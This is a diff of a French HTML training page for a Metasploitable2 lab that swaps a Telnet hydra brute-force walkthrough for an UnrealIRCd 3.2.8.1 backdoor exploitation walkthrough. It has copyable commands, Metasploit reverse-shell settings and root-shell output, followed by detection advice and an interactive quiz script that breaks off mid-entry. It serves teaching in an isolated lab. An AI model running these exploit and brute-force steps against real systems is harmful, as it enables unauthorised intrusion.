@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Telnet — Bruteforce</title>
+<title>UnrealIRCd — Backdoor IRC</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="lab.css">
@@ -13,16 +13,16 @@
   <div class="wrap">
     <div class="hero">
       <p class="breadcrumb"><a href="index.html">← Hub</a></p>
-      <p class="kicker">metasploitable2 :: auth faible → bruteforce → shell</p>
-      <h1>Telnet<br>Bruteforce</h1>
-      <p class="lead">Aucune faille logicielle ici : un service en clair, des identifiants faibles, et une absence totale de limitation des tentatives. L'attaque tient en une commande.</p>
+      <p class="kicker">metasploitable2 :: recon → exploit → post-exploit</p>
+      <h1>UnrealIRCd<br>Backdoor IRC</h1>
+      <p class="lead">Même famille d'incident que vsftpd : une archive officielle piégée. Cette fois sur un serveur IRC, avec une commande magique qui déclenche l'exécution à distance.</p>
       <div class="meta-row">
         <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
         <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
         <div class="meta-item"><span class="label">Réseau</span><span class="value">Réseau interne VirtualBox (isolé)</span></div>
-        <div class="meta-item"><span class="label">Résultat</span><span class="badge">shell utilisateur (msfadmin)</span></div>
-        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">1/10 · Introduction</span></div>
-        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff8a5c; border:1px solid #ff8a5c; background:#ff8a5c18;">3/5 · Shell utilisateur</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">root obtenu</span></div>
+        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">2/10 · Introduction</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff5c72; border:1px solid #ff5c72; background:#ff5c7218;">4/5 · Contrôle total</span></div>
       </div>
     </div>
   </div>
@@ -30,29 +30,39 @@
   <div class="wrap">
     <section id="chrono">
       <h2 class="section-title">Chronologie</h2>
-      <p class="section-intro">Quatre étapes. La substance n'est pas dans hydra — elle est dans ce qu'elle révèle sur la configuration du service.</p>
+      <p class="section-intro">Six étapes : reconnaissance, choix du port, recherche d'exploit, chargement du module, configuration, exploitation et vérification.</p>
 
       <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
       <div class="playbook">
         <div class="playbook-row">
           <div class="playbook-num">1</div>
           <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
-          <div class="playbook-why">Lister tous les services. Repérer telnet, protocole en clair sur le port 23.</div>
+          <div class="playbook-why">Lister tous les services. Repérer UnrealIRCd 3.2.8.1 sur le port 6667.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">2</div>
           <div class="playbook-what"><strong>Choix du port</strong><span>reconnaissance visuelle</span></div>
-          <div class="playbook-why">Cibler le port 23 : un service qui ne chiffre rien et n'a pas de limite de tentatives.</div>
+          <div class="playbook-why">Version précise connue pour une backdoor injectée dans l'archive officielle (2009-2010).</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">3</div>
-          <div class="playbook-what"><strong>Bruteforce</strong><span>hydra -l msfadmin -P ...</span></div>
-          <div class="playbook-why">Un seul login connu, un dictionnaire standard, une cible telnet://.</div>
+          <div class="playbook-what"><strong>Recherche d'exploit</strong><span>searchsploit unrealircd</span></div>
+          <div class="playbook-why">Croiser la version exacte avec la base d'exploits publics.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">4</div>
-          <div class="playbook-what"><strong>Connexion et vérification</strong><span>telnet / whoami</span></div>
-          <div class="playbook-why">Ouvrir une session interactive avec les identifiants trouvés, vérifier l'identité obtenue.</div>
+          <div class="playbook-what"><strong>Chargement du module</strong><span>msfconsole / search / use</span></div>
+          <div class="playbook-why">Charger exploit/unix/irc/unreal_ircd_3281_backdoor.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">5</div>
+          <div class="playbook-what"><strong>Configuration</strong><span>set payload / RHOSTS / LHOST</span></div>
+          <div class="playbook-why">Payload shell Unix brut (cmd/unix/reverse), pas meterpreter.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">6</div>
+          <div class="playbook-what"><strong>Exploitation</strong><span>run</span></div>
+          <div class="playbook-why">Déclencher la backdoor, vérifier l'accès root obtenu.</div>
         </div>
       </div>
 
@@ -61,7 +71,7 @@
         <div class="step">
           <div class="step-num">1</div>
           <h3>Reconnaissance complète — nmap</h3>
-          <p class="step-sub">Lister tous les ports ouverts. On repère ensuite celui qui nous intéresse.</p>
+          <p class="step-sub">Lister tous les ports ouverts. On trie ensuite.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
             <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
@@ -69,88 +79,106 @@
 <span class="out">21/tcp   open  ftp         vsftpd 2.3.4</span>
 <span class="out">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1</span>
 <span class="out">23/tcp   open  telnet      Linux telnetd</span>
-<span class="out">25/tcp   open  smtp        Postfix smtpd</span>
-<span class="out">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>
+<span class="out">80/tcp   open  http        Apache httpd 2.2.8</span>
 <span class="out">111/tcp  open  rpcbind     2 (RPC #100000)</span>
 <span class="out">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X</span>
 <span class="out">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian</span>
-<span class="out">512/tcp  open  exec        netkit-rsh rexecd</span>
-<span class="out">513/tcp  open  login?</span>
-<span class="out">514/tcp  open  shell       Netkit rshd</span>
-<span class="out">1099/tcp open  java-rmi    GNU Classpath grmiregistry</span>
 <span class="out">1524/tcp open  ingreslock?</span>
 <span class="out">2049/tcp open  nfs         2-4 (RPC #100003)</span>
 <span class="out">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span>
 <span class="out">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span>
 <span class="out">5900/tcp open  vnc         VNC (protocol 3.3)</span>
-<span class="out">6000/tcp open  X11         (access denied)</span>
-<span class="out">6667/tcp open  irc         UnrealIRCd</span>
-<span class="out">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span>
+<span class="out">6667/tcp open  irc         UnrealIRCd 3.2.8.1</span>
 <span class="out">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span></pre>
           </div>
           <div class="explain">
-            <span class="k">-sV</span><span class="v">détecte la version de chaque service.</span>
+            <span class="k">-sV</span><span class="v">versions exactes — indispensables : une backdoor cible une version précise.</span>
             <span class="k">-sC</span><span class="v">scripts NSE par défaut.</span>
-            <span class="k">triage</span><span class="v">On cherche un service simple à attaquer : pas de chiffrement, pas de verrouillage, mots de passe faibles.</span>
+            <span class="k">triage</span><span class="v">On cherche un service dont la version exacte est documentée comme vulnérable.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">2</div>
           <h3>Choix du port à cibler</h3>
-          <p class="step-sub">Un service se démarque : protocole en clair, connu pour ne pas imposer de limite de tentatives.</p>
+          <p class="step-sub">Un service avec une version très précise : UnrealIRCd 3.2.8.1.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>rappel de la sortie nmap</div>
-            <pre><span class="out">23/tcp   open  telnet      Linux telnetd</span>
-<span class="out">…</span></pre>
+            <pre><span class="out">6667/tcp open  irc         UnrealIRCd 3.2.8.1</span></pre>
           </div>
           <div class="explain">
-            <span class="k">indice</span><span class="v">Un service en clair, sur un port bien identifié, sur un système ancien.</span>
-            <span class="k">à retenir</span><span class="v">Un service qui n'a aucune protection contre les tentatives répétées est le candidat idéal pour un bruteforce.</span>
+            <span class="k">indice</span><span class="v">3.2.8.1 — c'est cette version exacte qui a été piégée par une backdoor dans l'archive officielle entre 2009 et 2010.</span>
+            <span class="k">à retenir</span><span class="v">Une version très précise, isolée sur un port, est un signal fort qu'un exploit documenté existe.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">3</div>
-          <h3>Bruteforce — hydra</h3>
-          <p class="step-sub">Un seul utilisateur connu (msfadmin), dictionnaire standard Kali (rockyou).</p>
-          <div class="prereq">
-            <span class="prereq-tag">⚠ sur une vraie Kali</span>
-            <span>
-              Sur une installation récente, <code>rockyou.txt</code> est livré compressé (<code>rockyou.txt.gz</code>) — hydra ne trouvera pas le fichier tant qu'il n'est pas décompressé. Avant de lancer la commande :<br>
-              <code>ls -lh /usr/share/wordlists/</code><br>
-              <code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code>
-            </span>
-          </div>
+          <h3>Recherche d'exploit — searchsploit</h3>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.20<button class="copy-btn" type="button" data-copy="hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">Hydra v9.5 (c) 2023 by van Hauser/THC</span>
-<span class="out">[DATA] attacking telnet://192.168.56.20:23/</span>
-<span class="ok">[23][telnet] host: 192.168.56.20   login: msfadmin   password: msfadmin</span>
-<span class="out">1 of 1 target successfully completed, 1 valid password found</span></pre>
+            <pre><span class="prompt">$</span> searchsploit unrealircd<button class="copy-btn" type="button" data-copy="searchsploit unrealircd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">UnrealIRCd 3.2.8.1 - Backdoor Command Execution        | linux/remote/16921.rb</span>
+<span class="out">UnrealIRCd 3.2.8.1 - Backdoor Command Execution (MSF)  | linux/remote/17900.rb</span></pre>
           </div>
           <div class="explain">
-            <span class="k">-l</span><span class="v">un seul login à tester (minuscule L). On sait déjà que msfadmin existe.</span>
-            <span class="k">-P</span><span class="v">fichier de mots de passe (majuscule P). Chaque ligne est essayée.</span>
-            <span class="k">telnet://</span><span class="v">précise le protocole cible — hydra sait comment se connecter.</span>
+            <span class="k">bilan</span><span class="v">Deux résultats. Le second (17900.rb) est <strong>déjà intégré à Metasploit</strong> — c'est celui-ci qu'il faut charger.</span>
+            <span class="k">.rb</span><span class="v">Module Ruby prêt pour msfconsole.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">4</div>
-          <h3>Connexion et vérification</h3>
-          <p class="step-sub">Utiliser les identifiants trouvés, puis confirmer l'identité effective.</p>
+          <h3>Chargement du module Metasploit</h3>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> telnet 192.168.56.20<button class="copy-btn" type="button" data-copy="telnet 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">metasploitable login: </span><span class="ok">msfadmin</span>
-<span class="out">Password: </span><span class="ok">msfadmin</span>
-<span class="ok">msfadmin@metasploitable:~$</span></pre>
+            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf ></span> search unrealircd<button class="copy-btn" type="button" data-copy="search unrealircd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12  excellent  Yes</span>
+
+<span class="prompt">msf ></span> use exploit/unix/irc/unreal_ircd_3281_backdoor<button class="copy-btn" type="button" data-copy="use exploit/unix/irc/unreal_ircd_3281_backdoor" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">msf exploit(unreal_ircd_3281_backdoor) ></span></pre>
           </div>
           <div class="explain">
-            <span class="k">telnet IP</span><span class="v">ouvre une session interactive ; contrairement à netcat, telnet négocie le protocole et permet de saisir login/mot de passe.</span>
-            <span class="k">leçon</span><span class="v">La force de l'attaque tenait à la faiblesse du mot de passe et à l'absence de limitation. Le protocole en clair aggrave tout.</span>
+            <span class="k">backdoor</span><span class="v">Code malveillant ajouté dans l'archive officielle. La backdoor écoute les messages IRC et exécute toute commande préfixée par « AB ».</span>
+            <span class="k">rank</span><span class="v">excellent — fiable, sans risque de planter le service.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <h3>Configuration — payload + RHOSTS + LHOST</h3>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(…) ></span> set payload cmd/unix/reverse<button class="copy-btn" type="button" data-copy="set payload cmd/unix/reverse" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">payload => cmd/unix/reverse</span>
+<span class="prompt">msf exploit(…) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RHOSTS => 192.168.56.20</span>
+<span class="prompt">msf exploit(…) ></span> set LHOST 192.168.56.10<button class="copy-btn" type="button" data-copy="set LHOST 192.168.56.10" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">LHOST => 192.168.56.10</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">payload</span><span class="v">cmd/unix/reverse : shell Unix brut, pas de meterpreter (incompatible avec le service IRC).</span>
+            <span class="k">RHOSTS / LHOST</span><span class="v">Cible + adresse de retour, comme d'habitude.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <h3>Exploitation et vérification</h3>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>msfconsole</div>
+            <pre><span class="prompt">msf exploit(…) ></span> run<button class="copy-btn" type="button" data-copy="run" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444</span>
+<span class="ok">[+] Backdoor triggered! Command execution confirmed</span>
+<span class="ok">[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:42617)</span>
+
+<span class="prompt">#</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">shell direct</span><span class="v">Pas de session meterpreter intermédiaire. On est directement dans un shell Unix.</span>
+            <span class="k">root direct</span><span class="v">Le service tournait en root → la backdoor hérite des droits administrateur.</span>
           </div>
         </div>
 
@@ -164,22 +192,26 @@
       <div class="cheat-group">
         <h4>reconnaissance</h4>
         <table class="cheat">
-          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports + versions + scripts NSE</td></tr>
+          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports + versions + scripts</td></tr>
+          <tr><td class="cmd">searchsploit unrealircd</td><td class="desc">exploits publics</td></tr>
         </table>
       </div>
 
       <div class="cheat-group">
-        <h4>bruteforce</h4>
+        <h4>metasploit</h4>
         <table class="cheat">
-          <tr><td class="cmd">hydra -l USER -P WORDLIST telnet://IP</td><td class="desc">test d'un login unique contre un dictionnaire</td></tr>
+          <tr><td class="cmd">use exploit/unix/irc/unreal_ircd_3281_backdoor</td><td class="desc">charger le module</td></tr>
+          <tr><td class="cmd">set payload cmd/unix/reverse</td><td class="desc">payload adapté (pas meterpreter)</td></tr>
+          <tr><td class="cmd">set RHOSTS / set LHOST</td><td class="desc">cible + adresse de retour</td></tr>
+          <tr><td class="cmd">run</td><td class="desc">lancer l'exploit</td></tr>
         </table>
       </div>
 
       <div class="cheat-group">
-        <h4>connexion &amp; post-exploitation</h4>
+        <h4>post-exploitation</h4>
         <table class="cheat">
-          <tr><td class="cmd">telnet IP</td><td class="desc">ouvrir une session interactive</td></tr>
-          <tr><td class="cmd">whoami / id</td><td class="desc">identité courante et groupes</td></tr>
+          <tr><td class="cmd">whoami / id</td><td class="desc">identité et groupes</td></tr>
+          <tr><td class="cmd">pwd / ls /</td><td class="desc">explorer le système</td></tr>
         </table>
       </div>
     </section>
@@ -188,57 +220,63 @@
       <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
       <div class="concepts">
         <div class="concept">
-          <h4>Le bruteforce n'est pas une faille, c'est une configuration</h4>
-          <p>hydra ne découvre aucune vulnérabilité dans telnetd. Il exploite une <strong>absence de protection</strong> : le service accepte un nombre illimité de tentatives.</p>
+          <h4>Backdoor ≠ vulnérabilité classique</h4>
+          <p>Comme pour vsftpd, c'est une archive officielle modifiée après compromission du serveur de distribution. Pas d'exploit technique — juste un motif de message à envoyer.</p>
         </div>
         <div class="concept">
-          <h4>Protocole en clair : un double problème</h4>
-          <p>telnet transmet tout sans chiffrement, y compris les identifiants. Un sniffer aurait vu le mot de passe correct passer pendant la connexion réussie.</p>
+          <h4>Une commande magique comme déclencheur</h4>
+          <p>UnrealIRCd 3.2.8.1 écoute les messages IRC. Toute commande préfixée par <strong>AB</strong> est interprétée comme une commande shell. Un simple message suffit.</p>
         </div>
         <div class="concept">
-          <h4>Attaque ciblée vs attaque aveugle</h4>
-          <p>hydra peut tester des milliers de logins. Ici, on connaît déjà msfadmin — l'attaque est chirurgicale. Le dictionnaire n'a même pas besoin d'être énorme.</p>
+          <h4>Pas de meterpreter — un shell Unix brut</h4>
+          <p>Le module utilise <strong>cmd/unix/reverse</strong>. On obtient directement un shell système, sans couche intermédiaire.</p>
         </div>
       </div>
     </section>
 
     <section id="anatomie">
-      <h2 class="section-title">Anatomie du bruteforce</h2>
-      <p class="section-intro">Pourquoi cette attaque fonctionne sur telnet — et pourquoi elle ne fonctionnerait pas sur SSH configuré correctement.</p>
+      <h2 class="section-title">Anatomie de la backdoor</h2>
+      <p class="section-intro">Comment du code malveillant s'est retrouvé dans l'archive officielle d'UnrealIRCd.</p>
 
       <div class="concepts">
         <div class="concept">
-          <h4>Absence de limitation des tentatives</h4>
-          <p>telnetd ne compte pas les échecs, n'impose aucun délai, ne verrouille jamais le compte. Un service qui bloque après 5 échecs rendrait un dictionnaire de 14 millions de mots de passe totalement inutile.</p>
+          <h4>Une archive piégée sur le site officiel</h4>
+          <p>Entre novembre 2009 et juin 2010, l'archive <code style="font-family:var(--mono); color:var(--text);">Unreal3.2.8.1.tar.gz</code> proposée sur le site officiel a été remplacée par une version modifiée. Le numéro affiché restait 3.2.8.1.</p>
         </div>
         <div class="concept">
-          <h4>Identification préalable des comptes valides</h4>
-          <p>Telnet ne protège pas l'existence des comptes : un login inexistant et un login existant avec mauvais mot de passe produisent des réponses différentes. Une énumération préalable suffit.</p>
+          <h4>Le déclencheur — commande préfixée « AB »</h4>
+          <p>Tout message commençant par <strong>AB</strong> est interprété comme une commande shell, exécutée avec les privilèges du processus IRC (ici root).</p>
+          <div class="term" style="margin-top:14px;">
+            <div class="term-bar"><span class="dot"></span>reconstruction pédagogique — pas le code exact</div>
+            <pre style="color:var(--muted);">// principe du contrôle ajouté au traitement des messages IRC
+<span class="out">if (message starts with "AB") {</span>
+<span class="out">    execute_shell_command(message + 2);</span>
+<span class="out">}</span></pre>
+          </div>
         </div>
         <div class="concept">
-          <h4>Pourquoi le mot de passe est « msfadmin »</h4>
-          <p>Metasploitable 2 est volontairement vulnérable. Les comptes par défaut ont des mots de passe triviaux, souvent identiques au login. Un bruteforce n'a même pas besoin de forcer : il suffit de tester les évidences.</p>
+          <h4>Pourquoi ça change la méthode de recherche</h4>
+          <p>Seule une vérification d'intégrité (hash SHA-1 ou MD5) aurait permis de détecter la compromission avant installation.</p>
         </div>
       </div>
     </section>
 
     <section id="detection">
       <h2 class="section-title">Détection &amp; remédiation</h2>
-      <p class="section-intro">Le point de vue du défenseur.</p>
 
       <div class="cheat-group">
         <table class="cheat">
-          <tr><td class="cmd">grep "FAILED LOGIN" /var/log/auth.log</td><td class="desc">détecter une rafale d'échecs sur le même compte</td></tr>
-          <tr><td class="cmd">fail2ban avec filtre telnet</td><td class="desc">bloquer l'IP source après N échecs — contre-mesure directe</td></tr>
-          <tr><td class="cmd">désactiver telnet, passer à SSH</td><td class="desc">SSH chiffre la session ET l'authentification</td></tr>
-          <tr><td class="cmd">politique de mots de passe</td><td class="desc">interdire les mots de passe triviaux / identiques au login</td></tr>
+          <tr><td class="cmd">sha1sum Unreal3.2.8.1.tar.gz</td><td class="desc">comparer le hash à celui publié par les mainteneurs</td></tr>
+          <tr><td class="cmd">netstat / ss -tulpn</td><td class="desc">surveiller les connexions sortantes anormales depuis le serveur IRC</td></tr>
+          <tr><td class="cmd">règle IDS</td><td class="desc">signature pour les messages IRC commençant par "AB"</td></tr>
+          <tr><td class="cmd">ne pas tourner en root</td><td class="desc">limiter l'impact si la backdoor est exploitée</td></tr>
         </table>
       </div>
     </section>
 
     <section id="practice">
       <h2 class="section-title">Terminal d'entraînement</h2>
-      <p class="section-intro">Rejoue la chaîne : lire la sortie nmap, choisir le port 23, lancer hydra, se connecter, vérifier l'identité.</p>
+      <p class="section-intro">Rejoue la chaîne : reconnaissance, choix du port, searchsploit, msfconsole, configuration, exploitation, vérification.</p>
 
       <div class="term-launch">
         <button class="term-launch-btn" id="term-open-btn" type="button">
@@ -272,7 +310,7 @@
       <div class="phase-track" id="phase-track"></div>
       <div class="term-progress">
         <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
-        <span class="term-progress-label" id="sim-progress">étape 1/5</span>
+        <span class="term-progress-label" id="sim-progress">étape 1/9</span>
       </div>
       <div class="term-fs-consigne" id="term-fs-consigne">
         <span class="consigne-tag" id="consigne-tag">Consigne</span>
@@ -302,46 +340,153 @@
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
       task:"Lance une reconnaissance complète sur la cible.",
       accepted:["nmap -sv -sc 192.168.56.20"],
-      hint:"Même outil que dans les cours précédents. -sV pour les versions, -sC pour les scripts NSE par défaut.",
+      hint:"Même outil que dans les cours précédents : -sV + -sC.",
       hint2:"nmap -sV -sC 192.168.56.20",
-      note:"nmap -sV -sC &lt;cible&gt; → toutes les versions + scripts NSE, point de départ standard.",
+      note:"nmap -sV -sC &lt;cible&gt; → point de départ standard.",
       output:[
         {t:"PORT     STATE SERVICE     VERSION", c:"o"},
         {t:"21/tcp   open  ftp         vsftpd 2.3.4", c:"o"},
         {t:"22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1", c:"o"},
-        {t:"23/tcp   open  telnet      Linux telnetd", c:"o", id:"hl-telnet"},
-        {t:"25/tcp   open  smtp        Postfix smtpd", c:"o"},
-        {t:"80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)", c:"o"},
+        {t:"23/tcp   open  telnet      Linux telnetd", c:"o"},
+        {t:"80/tcp   open  http        Apache httpd 2.2.8", c:"o"},
         {t:"111/tcp  open  rpcbind     2 (RPC #100000)", c:"o"},
         {t:"139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X", c:"o"},
         {t:"445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian", c:"o"},
-        {t:"512/tcp  open  exec        netkit-rsh rexecd", c:"o"},
-        {t:"513/tcp  open  login?", c:"o"},
-        {t:"514/tcp  open  shell       Netkit rshd", c:"o"},
-        {t:"1099/tcp open  java-rmi    GNU Classpath grmiregistry", c:"o"},
         {t:"1524/tcp open  ingreslock?", c:"o"},
         {t:"2049/tcp open  nfs         2-4 (RPC #100003)", c:"o"},
         {t:"3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5", c:"o"},
         {t:"5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7", c:"o"},
         {t:"5900/tcp open  vnc         VNC (protocol 3.3)", c:"o"},
-        {t:"6667/tcp open  irc         UnrealIRCd", c:"o"},
+        {t:"6667/tcp open  irc         UnrealIRCd 3.2.8.1", c:"o", id:"hl-irc"},
         {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"}
       ] },
 
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Un service est un candidat idéal pour un bruteforce. Tape son numéro de port.",
-      accepted:["23"],
+      task:"Un service a une version très précise, connue pour être vulnérable. Tape son numéro de port.",
+      accepted:["6667"],
       wrongAnswers:{
-        "21":"vsftpd a une backdoor — c'est un autre cours.",
-        "22":"SSH est chiffré et plus lourd à bruteforcer. Cherche un protocole en clair.",
-        "80":"Apache n'est pas notre cible ici.",
-        "3306":"MySQL demande des identifiants — on cherche un service qui ne les protège pas."
+        "21":"vsftpd a une autre faille connue — ce n'est pas notre cible ici.",
+        "23":"Telnet n'a pas de version précise documentée comme vulnérable ici.",
+        "80":"Apache n'est pas la cible.",
+        "3306":"MySQL demande des identifiants."
       },
-      hint:"Cherche un protocole en clair sur un système ancien, sans limitation de tentatives.",
-      hint2:"Le port 23 = telnet. Protocole en clair, aucune protection contre les tentatives répétées.",
-      highlightIds:["hl-telnet"],
-      note:"Le protocole telnet envoie tout en clair et n'offre aucune limitation de tentatives — candidat idéal pour un bruteforce par dictionnaire.",
+      hint:"Cherche un service avec une version très précise et isolée, sur un port bien identifié.",
+      hint2:"6667/tcp = UnrealIRCd 3.2.8.1 — version exacte connue pour une backdoor injectée dans l'archive officielle.",
+      highlightIds:["hl-irc"],
+      note:"UnrealIRCd 3.2.8.1 → version piégée : un module Metasploit documenté existe pour cette version.",
       output:[] },
 
-    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"$",
-      task:"
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Cherche des exploits publics pour ce service.",
+      accepted:["searchsploit unrealircd"],
+      hint:"Base locale d'exploits Kali. Mot-clé = nom du service.",
+      hint2:"searchsploit unrealircd",
+      note:"searchsploit &lt;service&gt; → recherche par mot-clé dans la base d'exploits locale.",
+      output:[
+        {t:"UnrealIRCd 3.2.8.1 - Backdoor Command Execution        | linux/remote/16921.rb", c:"o"},
+        {t:"UnrealIRCd 3.2.8.1 - Backdoor Command Execution (MSF)  | linux/remote/17900.rb", c:"o", id:"hl-msf"}
+      ] },
+
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Un des deux résultats est déjà packagé pour Metasploit. Tape son identifiant (fin du chemin).",
+      accepted:["17900.rb"],
+      wrongAnswers:{
+        "16921.rb":"Ce chemin n'est pas packagé pour Metasploit — regarde le titre qui précise (MSF)."
+      },
+      hint:"Regarde le titre : une ligne mentionne explicitement (MSF).",
+      hint2:"17900.rb — le titre précise (MSF), c'est un module Metasploit prêt à charger.",
+      highlightIds:["hl-msf"],
+      note:"Un chemin en .rb avec mention (MSF) = module déjà prêt pour Metasploit.",
+      output:[] },
+
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Lance la console Metasploit.",
+      accepted:["msfconsole"],
+      hint:"Le framework interactif, une seule commande depuis Kali.",
+      note:"msfconsole → console interactive de Metasploit.",
+      output:[
+        {t:"=[ metasploit v6.4.135-dev ]", c:"o"}
+      ] },
+
+    { kind:"type", phase:"recherche", context:"msf", prompt:">",
+      task:"Cherche le module correspondant dans Metasploit.",
+      accepted:["search unrealircd"],
+      hint:"Recherche par mot-clé dans la console msf.",
+      note:"search &lt;mot-clé&gt; → cherche un module dans la base intégrée de Metasploit.",
+      output:[
+        {t:"0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12  excellent  Yes", c:"o"}
+      ] },
+
+    { kind:"type", phase:"config", context:"msf", prompt:">",
+      task:"Charge le module.",
+      accepted:["use exploit/unix/irc/unreal_ircd_3281_backdoor", "use 0"],
+      hint:"use + chemin complet du module.",
+      note:"use &lt;chemin/module&gt; → charge un module dans la console.",
+      output:[] },
+
+    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Définis le payload : shell Unix brut en reverse (pas meterpreter).",
+      accepted:["set payload cmd/unix/reverse"],
+      hint:"Le service IRC ne supporte pas meterpreter. Cherche un payload de type shell Unix brut qui fait un reverse.",
+      hint2:"set payload cmd/unix/reverse",
+      note:"set payload cmd/unix/reverse → payload de type shell Unix brut avec connexion retour (adapté aux services incompatibles avec meterpreter).",
+      output:[{t:"payload => cmd/unix/reverse", c:"ok"}] },
+
+    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Définis la cible (RHOSTS).",
+      accepted:["set rhosts 192.168.56.20"],
+      hint:"Variable standard pour l'hôte distant.",
+      note:"RHOSTS = adresse de la cible.",
+      output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
+
+    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Définis LHOST (ton IP, pour le reverse shell).",
+      accepted:["set lhost 192.168.56.10"],
+      hint:"Ton adresse, pour que la cible rappelle Kali.",
+      note:"LHOST = ta propre adresse.",
+      output:[{t:"LHOST => 192.168.56.10", c:"ok"}] },
+
+    { kind:"type", phase:"exploitation", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Lance l'exploit.",
+      accepted:["run", "exploit"],
+      hint:"Verbe d'action — run ou exploit.",
